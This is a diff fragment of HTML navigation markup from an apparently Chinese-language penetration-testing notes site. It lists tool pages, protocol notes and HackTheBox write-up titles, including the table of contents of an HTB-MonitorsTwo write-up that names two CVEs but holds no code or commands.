+      <a href="../../../arsenal/burpsuite/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Burpsuite
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/metasploit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Metasploit
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/sliver-c2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SliverC2
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/viper/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Viper
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/enumerate-tools/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Enumerate Tools
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/sqlmap/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    sqlmap
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../arsenal/ldapsearch/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ldapsearch
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Resources
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            Resources
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/simple-network-service/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    简单网络服务渗透
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Shell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/powershell/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    PowerShell
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_4" id="__nav_8_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Network
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_4">
+            <span class="md-nav__icon md-icon"></span>
+            Network
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Email/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Email
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_4_2" id="__nav_8_4_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Protocol
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_8_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Protocol
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/DNS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/Whois/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Whois
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/ICMP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    ICMP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/SSH/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSH
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/LDAP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    LDAP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/NetBIOS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NetBIOS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/SMB/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SMB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/RPC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    RPC
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/WinRM/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WinRM
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/SNMP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SNMP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/SMTP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SMTP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/NFS/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    NFS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Network/Protocol/Gopher/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Gopher
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_5" id="__nav_8_5_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    General
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_5">
+            <span class="md-nav__icon md-icon"></span>
+            General
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    正则表达式
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_6" id="__nav_8_6_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    API
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_6">
+            <span class="md-nav__icon md-icon"></span>
+            API
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/API/SASL/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SASL
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_7" id="__nav_8_7_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    PKI
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_7">
+            <span class="md-nav__icon md-icon"></span>
+            PKI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/PKI/%E5%85%AC%E9%92%A5%E8%AF%81%E4%B9%A6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    公钥证书
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8_8" id="__nav_8_8_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Linux
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_8_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8_8">
+            <span class="md-nav__icon md-icon"></span>
+            Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/Linux%E5%8F%91%E8%A1%8C%E7%89%88/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux发行版
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/Linux%E5%91%BD%E4%BB%A4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux命令
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/Linux%E5%90%84%E7%A7%8D%E6%8B%AC%E5%8F%B7/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux各种括号
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/Linux%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux文件权限
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E5%88%86%E5%8C%BA/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    分区
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E5%91%BD%E4%BB%A4%E9%A3%8E%E6%A0%BC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    命令风格
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E6%8D%A2%E8%A1%8C%E7%AC%A6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    换行符
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E9%85%8D%E7%BD%AELinux%E5%9B%BE%E5%BD%A2%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    配置Linux图形桌面连接
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/iptables/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    iptables
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    命名管道
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E4%BF%AE%E6%94%B9IP/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    修改IP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Resources/Linux/%E7%BB%88%E7%AB%AF/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    终端
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    BlueTeam
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            BlueTeam
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_9_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_9_1" id="__nav_9_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Splunk
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_9_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9_1">
+            <span class="md-nav__icon md-icon"></span>
+            Splunk
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BlueTeam/Splunk/SPL%20memo/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SPL memo
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BlueTeam/Splunk/Splunk%E7%9F%A5%E8%AF%86%E7%82%B9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Splunk知识点
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BlueTeam/Splunk/Knowledge%20Object/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Knowledge Object
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../BlueTeam/Email%E5%AE%89%E5%85%A8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Email安全
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    靶机WriteUp
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            靶机WriteUp
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../active/writeup-template/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    WP模板
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Precious/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Precious
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Shoppy/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Shoppy
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Soccer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Soccer
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-MetaTwo/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-MetaTwo
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Ambassador/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Ambassador
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-APT/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-APT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    HTB-MonitorsTwo
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    HTB-MonitorsTwo
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      扫描
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      漏洞分析
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="漏洞分析">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#80" class="md-nav__link">
+    <span class="md-ellipsis">
+      80端口
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Access
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#poc-cve-2022-46169" class="md-nav__link">
+    <span class="md-ellipsis">
+      PoC (CVE-2022-46169)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PoC (CVE-2022-46169)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1exploitdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      方法1：ExploitDB 脚本
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      方法2：metasploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#docker" class="md-nav__link">
+    <span class="md-ellipsis">
+      docker容器
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="docker容器">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#suid" class="md-nav__link">
+    <span class="md-ellipsis">
+      SUID提权（不需要）
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#db" class="md-nav__link">
+    <span class="md-ellipsis">
+      探索DB
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      密码暴破
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      flag: user
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      探索
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#poc-cve-2021-41091" class="md-nav__link">
+    <span class="md-ellipsis">
+      PoC (CVE-2021-41091)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flag-root" class="md-nav__link">
+    <span class="md-ellipsis">
+      flag: root
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      总结·后记
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Busqueda/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Busqueda
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-PC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-PC
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Inject/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Inject
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Stocker/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Stocker
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-OnlyForYou/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-OnlyForYou
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Escape/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Escape
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Topology/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Topology
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Pilgrimage/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Pilgrimage
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Sau/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Sau
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Authority/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Authority
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Codify/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Codify
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Hospital/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Hospital
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Devvortex/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Devvortex
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Surveillance/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Surveillance
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTB-Jab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    HTB-Jab
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
